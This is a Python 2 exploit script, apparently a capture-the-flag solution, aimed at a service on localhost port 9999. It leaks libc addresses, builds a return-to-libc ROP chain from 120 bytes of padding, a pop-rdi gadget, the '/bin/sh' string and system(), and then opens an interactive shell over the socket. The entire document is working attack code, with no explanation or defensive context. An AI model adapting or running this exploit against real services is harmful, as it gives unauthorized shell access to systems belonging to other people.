from struct import *
from socket import *
import time
import telnetlib

p = lambda x: pack("<Q", x)
up = lambda x : unpack("<Q", x)[0]

input()

s = socket(AF_INET, SOCK_STREAM)
s.connect(('127.0.0.1', 9999))

bss = 0x601060
poprdi_offset = 0x21102
bin_sh_offset = 0x18c177
offset_system = 0x45390

#leak address
print s.recv(1024)
time.sleep(1)

s.send("1\n")
print s.recv(51)
libc_addr = int(s.recv(14), 16)
print s.recv(12)
libc_system = int(s.recv(14), 16)

print "system : " + str(hex(libc_system))
print "libc : " + str(hex(libc_addr))

libc_addr = libc_system - offset_system

poprdi = libc_addr + poprdi_offset
bin_sh = libc_addr + bin_sh_offset
print "poprdi : " + hex(poprdi)
print "/bin/sh : " + hex(bin_sh)

#testing
print "\n=== testing address ==="
print s.recv(1024)
time.sleep(1)
s.send('1\n')
print s.recv(1024)
time.sleep(1)

#exploit
print "\n=== payload ==="
payload = ''
payload += 'A' * 120
payload += p(poprdi)
payload += p(bin_sh)

payload += p(libc_system)

s.send(payload+"\n")
print s.recv(1024)

t = telnetlib.Telnet()
t.sock = s
t.interact()

s.close()
